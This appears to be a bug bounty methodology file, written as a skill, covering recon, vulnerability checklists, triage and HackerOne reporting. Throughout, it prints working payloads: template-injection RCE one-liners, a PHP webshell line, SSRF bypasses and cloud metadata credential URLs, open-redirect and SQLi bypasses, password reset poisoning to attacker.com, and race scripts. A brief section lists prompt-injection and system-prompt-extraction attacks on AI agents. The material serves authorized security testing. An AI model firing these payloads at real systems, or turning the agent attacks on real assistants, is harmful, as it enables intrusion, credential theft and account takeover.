# Bug Bounty Master Workflow

Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for everything.

## THE ONLY QUESTION THAT MATTERS

> **"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions -- and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**
>
> If the answer is NO -- **STOP. Do not write. Do not explore further. Move on.**

### Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
|---|---|
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| Source maps without secrets | No impact |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

**You must demonstrate actual harm. "Could" is not a bug. Prove it works or drop it.**

---

## CRITICAL RULES

1. **READ FULL SCOPE FIRST** -- verify every asset/domain is owned by the target org
2. **NO THEORETICAL BUGS** -- "Can an attacker steal funds, leak PII, takeover account, or execute code RIGHT NOW?" If no, STOP.
3. **KILL WEAK FINDINGS FAST** -- run the 7-Question Gate BEFORE writing any report
4. **Validate before writing** -- check CHANGELOG, design docs, deployment scripts FIRST
5. **One bug class at a time** -- go deep, don't spray
6. **Verify data isn't already public** -- check web UI in incognito before reporting API "leaks"
7. **5-MINUTE RULE** -- if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
8. **IMPACT-FIRST HUNTING** -- ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
9. **CREDENTIAL LEAKS need exploitation proof** -- finding keys isn't enough, must PROVE what they access
10. **STOP SHALLOW RECON SPIRALS** -- don't probe 403s, don't grep for analytics keys, don't check staging domains that lead nowhere
11. **BUSINESS IMPACT over vuln class** -- severity depends on CONTEXT, not just vuln type
12. **UNDERSTAND THE TARGET DEEPLY** -- before hunting, learn the app like a real user
13. **DON'T OVER-RELY ON AUTOMATION** -- automated scans hit WAFs, trigger rate limits, find the same bugs everyone else finds
14. **HUNT LESS-SATURATED VULN CLASSES** -- XSS/SSRF/XXE have the most competition. Expand into: cache poisoning, Android/mobile vulns, business logic, race conditions, OAuth/OIDC chains, CI/CD pipeline attacks
15. **ONE-HOUR RULE** -- stuck on one target for an hour with no progress? SWITCH CONTEXT
16. **TWO-EYE APPROACH** -- combine systematic testing (checklist) with anomaly detection (watch for unexpected behavior)
17. **T-SHAPED KNOWLEDGE** -- go DEEP in one area and BROAD across everything else

## A->B BUG SIGNAL METHOD (Cluster Hunting)

**When you find bug A, systematically hunt for B and C nearby.** This is one of the most powerful methodologies in bug bounty. Single bugs pay. Chains pay 3-10x more.

### Known A->B->C Chains

| Bug A (Signal) | Hunt for Bug B | Escalate to C |
|----------------|---------------|---------------|
| IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil -> RCE |
| XSS (stored) | Check if HttpOnly is set on session cookie | Session hijack -> ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft -> ATO |
| S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret -> OAuth chain |
| Rate limit bypass | OTP brute force | Account takeover |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| Debug endpoint | Leaked environment variables | Cloud credential -> infrastructure access |
| CORS reflects origin | Test with credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO via reset link |

### Cluster Hunt Protocol (6 Steps)

```
1. CONFIRM A     Verify bug A is real with an HTTP request
2. MAP SIBLINGS  Find all endpoints in the same controller/module/API group
3. TEST SIBLINGS Apply the same bug pattern to every sibling
4. CHAIN         If sibling has different bug class, try combining A + B
5. QUANTIFY      "Affects N users" / "exposes $X value" / "N records"
6. REPORT        One report per chain (not per bug). Chains pay more.
```

### Real Examples

**Coinbase S3->Bundle->Secret->OAuth chain:**
```
A: S3 bucket publicly listable (Low alone)
B: JS bundles contain OAuth client credentials
C: OAuth flow missing PKCE enforcement
Result: Full auth code interception chain
```

**Vienna Chatbot chain:**
```
A: Debug parameter active in production (Info alone)
B: Chatbot renders HTML in response (dangerouslySetInnerHTML)
C: Stored XSS via bot response visible to other users
Result: P2 finding with real impact
```

# TOP 1% HACKER MINDSET

## How Elite Hackers Think Differently

**Average hunter**: Runs tools, checks checklist, gives up after 30 min.
**Top 1%**: Builds a mental model of the app's internals. Asks "why does this work the way it does?" Not "what does this endpoint do?" but "what business decision led a developer to build it this way, and what shortcut might they have taken?"

## Pre-Hunt Mental Framework

### Step 1: Crown Jewel Thinking
Before touching anything, ask: "If I were the attacker and I could do ONE thing to this app, what causes the most damage?"
- Financial app -> drain funds, transfer to attacker account
- Healthcare -> PII leak, HIPAA violation
- SaaS -> tenant data crossing, admin takeover
- Auth provider -> full SSO chain compromise

### Step 2: Developer Empathy
Think like the developer who built the feature:
- What was the simplest implementation?
- What shortcut would a tired dev take at 2am?
- Where is auth checked -- controller? middleware? DB layer?
- What happens when you call endpoint B without going through endpoint A first?

### Step 3: Trust Boundary Mapping
```
Client -> CDN -> Load Balancer -> App Server -> Database
         ^               ^              ^
    Where does app STOP trusting input?
    Where does it ASSUME input is already validated?
```

### Step 4: Feature Interaction Thinking
- Does this new feature reuse old auth, or does it have its own?
- Does the mobile API share auth logic with the web app?
- Was this feature built by the same team or a third-party?

## The Top 1% Mental Checklist
- [ ] I know the app's core business model
- [ ] I've used the app as a real user for 15+ minutes
- [ ] I know the tech stack (language, framework, auth system, caching)
- [ ] I've read at least 3 disclosed reports for this program
- [ ] I have 2 test accounts ready (attacker + victim)
- [ ] I've defined my primary target: ONE crown jewel I'm hunting for today

## Mindset Rules from Top Hunters

**"Hunt the feature, not the endpoint"** -- Find all endpoints that serve a feature, then test the INTERACTION between them.

**"Authorization inconsistency is your friend"** -- If the app checks auth in 9 places but not the 10th, that's your bug.

**"New == unreviewed"** -- Features launched in the last 30 days have lowest security maturity.

**"Think second-order"** -- Second-order SSRF: URL saved in DB, fetched by cron job. Second-order XSS: stored clean, rendered unsafely in admin panel.

**"Follow the money"** -- Any feature touching payments, billing, credits, refunds is where developers make the most security shortcuts.

**"The API the mobile app uses"** -- Mobile apps often call older/different API versions. Same company, different attack surface, lower maturity.

**"Diffs find bugs"** -- Compare old API docs vs new. Compare mobile API vs web API. Compare what a free user can request vs what a paid user gets in response.

## Technology Fingerprinting

| Signal | Technology |
|---|---|
| Cookie: `XSRF-TOKEN` + `*_session` | Laravel |
| Cookie: `PHPSESSID` | PHP |
| Header: `X-Powered-By: Express` | Node.js/Express |
| Response: `wp-json`/`wp-content` | WordPress |
| Response: `{"errors":[{"message":` | GraphQL |
| Header: `X-Powered-By: Next.js` | Next.js |

## Framework Quick Wins

**Laravel**: `/horizon`, `/telescope`, `/.env`, `/storage/logs/laravel.log`
**WordPress**: `/wp-json/wp/v2/users`, `/xmlrpc.php`, `/?author=1`
**Node.js**: `/.env`, `/graphql` (introspection), `/_debug`
**AWS Cognito**: `/oauth2/userInfo` (leaks Pool ID), CORS reflects arbitrary origins

## Source Code Recon
```bash

# PHASE 2: LEARN (Pre-Hunt Intelligence)

## Read Disclosed Reports
```bash
# By program on HackerOne
curl -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```

## "What Changed" Method
1. Find disclosed report for similar tech
2. Get the fix commit
3. Read the diff -- identify the anti-pattern
4. Grep your target for that same anti-pattern

## Threat Model Template
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```

## 6 Key Patterns from Top Reports
1. **Feature Complexity = Bug Surface** -- imports, integrations, multi-tenancy, multi-step workflows
2. **Developer Inconsistency = Strongest Evidence** -- `timingSafeEqual` in one place, `===` elsewhere
3. **"Else Branch" Bug** -- proxy/gateway passes raw token without validation in else path
4. **Import/Export = SSRF** -- every "import from URL" feature has historically had SSRF
5. **Secondary/Legacy Endpoints = No Auth** -- `/api/v1/` guarded but `/api/` isn't
6. **Race Windows in Financial Ops** -- check-then-deduct as two DB operations = double-spend

---

# PHASE 3: HUNT

## Note-Taking System (Never Hunt Without This)
```markdown
# TARGET: company.com -- SESSION 1

## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Rabbit Holes (time-boxed, max 15 min each)
- [ ] 10 min: JWT kid injection on auth endpoint

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

## Subdomain Type -> Hunt Strategy
- **dev/staging/test**: Debug endpoints, disabled auth, verbose errors
- **admin/internal**: Default creds, IP bypass headers (`X-Forwarded-For: 127.0.0.1`)
- **api/api-v2**: Enumerate with kiterunner, check older unprotected versions
- **auth/sso**: OAuth misconfigs, open redirect in `redirect_uri`
- **upload/cdn**: CORS, path traversal, stored XSS

## CVE-Seeded Audit Approach
1. **Build a CVE eval set** -- collect 5-10 prior CVEs for the target codebase
2. **Reproduce old bugs** -- verify you can find the pattern in older code
3. **Pattern-match forward** -- search for the same anti-pattern in current code
4. **Focus on wide attack surfaces** -- JS engines, parsers, anything processing untrusted external input

## Rust/Blockchain Source Code (Hard-Won Lessons)

**Panic paths: encoding vs decoding** -- `.unwrap()` on an encoding path is NOT attacker-triggerable. Only panics on deserialization/decoding of network input are exploitable.

**"Known TODO" is not a mitigation** -- A comment like `// Votes are not signed for now` doesn't mean safe.

**Pattern-based hunting from confirmed findings** -- If `verify_signed_vote` is broken, check `verify_signed_proposal` and `verify_commit_signature`.

```bash
# Rust dangerous patterns (network-facing)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "if let Ok\|let _ =" --include="*.rs" | grep -i "verify\|sign\|cert\|auth"
grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | grep -i "sign\|verify\|cert\|auth"
```

# VULNERABILITY HUNTING CHECKLISTS

## IDOR -- Insecure Direct Object Reference

> #1 most paid web2 class -- 30% of all submissions that get paid.

### IDOR Variants (10 Ways to Test)

| Variant | What to Test |
|---------|-------------|
| V1: Direct | Change object ID in URL path `/api/users/123` -> `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` -- request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist
- [ ] Create two accounts (A = attacker, B = victim)
- [ ] Log in as A, perform all actions, note all IDs in requests
- [ ] Log in as B, replay A's requests with A's IDs using B's auth
- [ ] Try EVERY endpoint with swapped IDs -- not just GET, also PUT/DELETE/PATCH
- [ ] Check API v1/v2 differences
- [ ] Check GraphQL schema for node() queries
- [ ] Check WebSocket messages for client-supplied IDs
- [ ] Test batch endpoints (can you request multiple IDs?)
- [ ] Try adding unexpected params: `?user_id=other_user`

### IDOR Chains (higher payout)
- IDOR + Read PII = Medium
- IDOR + Write (modify other's data) = High
- IDOR + Admin endpoint = Critical (privilege escalation)
- IDOR + Account takeover path = Critical
- IDOR + Chatbot (LLM reads other user's data) = High

## SSRF -- Server-Side Request Forgery

- [ ] Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
- [ ] Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
- [ ] Test all IP bypass techniques (see table below)
- [ ] Test protocol bypass: `file://`, `dict://`, `gopher://`
- [ ] Look in: webhook URLs, import from URL, profile picture URL, PDF generators, XML parsers

### SSRF IP Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (code execution on cloud)
- Docker API accessible = Critical (direct RCE)

## OAuth / OIDC

- [ ] Missing `state` parameter -> CSRF
- [ ] `redirect_uri` accepts wildcards -> ATO
- [ ] Missing PKCE -> code theft
- [ ] Implicit flow -> token leakage in referrer
- [ ] Open redirect in post-auth redirect -> OAuth token theft chain

### Open Redirect Bypass Table (11 Techniques)

Use these when chaining open redirect into OAuth code theft:

| Bypass | Payload | Notes |
|--------|---------|-------|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |

## File Upload

### File Upload Bypass Table

| Bypass | Technique |
|--------|-----------|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

### Magic Bytes Reference
| Type | Hex |
|------|-----|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

## Race Conditions

- [ ] Coupon codes / promo codes
- [ ] Gift card redemption
- [ ] Fund transfer / withdrawal
- [ ] Voting / rating limits
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder -- Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## Business Logic
- [ ] Negative quantities in cart
- [ ] Price parameter tampering
- [ ] Workflow skip (e.g., pay without checkout)
- [ ] Role escalation via registration fields
- [ ] Privilege persistence after downgrade

## XSS -- Cross-Site Scripting

### XSS Sinks (grep for these)
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass -> Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain

## SQL Injection

### Detection
```bash
# Single quote test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

# Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```

## GraphQL

### Introspection (alone = Informational, but reveals attack surface)
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Missing Field-Level Auth
```graphql
# User query returns only own data
{ user(id: 1) { name email } }
# But node() bypasses per-object auth:
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

### Batching Attack (Rate Limit Bypass)
```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  "...100 more..."
]
```

## LLM / AI Features

- [ ] Prompt injection via user input passed to LLM
- [ ] Indirect injection via document/URL the AI processes
- [ ] IDOR in chat history (enumerate conversation IDs)
- [ ] System prompt extraction via roleplay/encoding
- [ ] RCE via code execution tool abuse
- [ ] ASCII smuggling (invisible unicode in LLM output)

### Agentic AI Hunting (OWASP ASI01-ASI10)

When target has AI agents with tool access, these are the 10 attack classes:

| ID | Vuln Class | What to Test |
|----|-----------|-------------|
| ASI01 | Prompt injection | Override system prompt via user input -- make agent ignore its rules |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF via "fetch URL", RCE via code tool) |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts that leak context |
| ASI04 | Privilege escalation | Use AI to access admin-only tools -- agent has broader perms than user |
| ASI05 | Indirect injection | Poison document/URL the AI processes -- hidden instructions in fetched content |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation -- delete, send, pay |
| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.

## Cache Poisoning / Web Cache Deception
- [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` -- unkeyed headers reflected in response
- [ ] Parameter cloaking (`?param=value;poison=xss`)
- [ ] Fat GET (body params on GET requests)
- [ ] Web cache deception (`/account/settings.css` -- trick cache into storing private response)
- [ ] Param Miner (Burp extension) -- auto-discovers unkeyed headers

## HTTP Request Smuggling
- [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- [ ] H2.CL: HTTP/2 downgrade smuggling
- [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
- [ ] Use Burp "HTTP Request Smuggler" extension -- detects automatically

### CL.TE Example
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Frontend reads Content-Length: 13 -> sends all. Backend reads Transfer-Encoding -> sees chunk "0" = end -> "SMUGGLED" left in buffer -> next user's request poisoned.

## Android / Mobile Hunting
- [ ] Certificate pinning bypass (Frida/objection)
- [ ] Exported activities/receivers (AndroidManifest.xml)
- [ ] Deep link injection
- [ ] Shared preferences / SQLite in cleartext
- [ ] WebView JavaScript bridge
- [ ] Mobile API often uses older/different API version than web

## CI/CD Pipeline
- [ ] GitHub Actions: `pull_request_target` with checkout of PR code
- [ ] Secrets in workflow logs
- [ ] Artifact poisoning (overwrite existing artifacts)
- [ ] Build command injection via branch/tag names
- [ ] OIDC token theft from CI runners

## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```

## Subdomain Takeover

### Detection
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation
- Basic takeover: serve page under target.com subdomain -> Low/Medium
- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical

## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.

## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl -s http://TARGET:2375/containers/json
```

# PHASE 4: VALIDATE

## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO -> STOP.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request -> KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it -> KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

## 4 Pre-Submission Gates

### Gate 0: Reality Check (30 seconds)
```
[ ] The bug is real -- confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope -- checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### Gate 1: Impact Validation (2 minutes)
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### Gate 2: Deduplication Check (5 minutes)
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### Gate 3: Report Quality (10 minutes)
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```

## CVSS 3.1 Quick Guide

| Factor | Low (0-3.9) | Medium (4-6.9) | High (7-8.9) | Critical (9-10) |
|--------|-------------|----------------|--------------|-----------------|
| Attack Vector | Physical | Local | Adjacent | Network |
| Privileges | High | Low | None | None |
| User Interaction | Required | Required | None | None |
| Impact | Partial | Partial | High | High (all 3) |

### Typical Scores by Bug Class

| Bug | Typical CVSS | Severity |
|----|------|---------|
| IDOR (read PII) | 6.5 | Medium |
| IDOR (write/delete) | 7.5 | High |
| Auth bypass -> admin | 9.8 | Critical |
| Stored XSS | 5.4-8.8 | Med-High |
| SQLi (data exfil) | 8.6 | High |
| SSRF (cloud metadata) | 9.1 | Critical |
| Race condition (double spend) | 7.5 | High |
| GraphQL auth bypass | 8.7 | High |
| JWT none algorithm | 9.1 | Critical |

# ALWAYS REJECTED -- Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover (usually), autocomplete on password fields.

**N/A hurts your validity ratio. Informative is neutral. Only submit what passes the 7-Question Gate.**

## Conditionally Valid With Chain

These low findings become valid bugs when chained:

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |
| CSRF | + sensitive state change | Account takeover |
| No rate limit | + OTP brute force | ATO |
| SSRF (DNS only) | + internal access proof | Internal network access |
| Host header injection | + password reset poisoning | ATO |
| Self-XSS | + login CSRF | Stored XSS on victim |

# PHASE 5: REPORT

## HackerOne Report Template

```
Title: [Vuln Class] in [endpoint/feature] leads to [Impact]

## Summary
[2-3 sentences: what it is, where it is, what attacker can do]

## Steps To Reproduce
1. Log in as attacker (account A)
2. Send request: [paste exact request]
3. Observe: [exact response showing the bug]
4. Confirm: [what the attacker gained]

## Supporting Material
[Screenshot / video of exploitation]
[Burp Suite request/response]

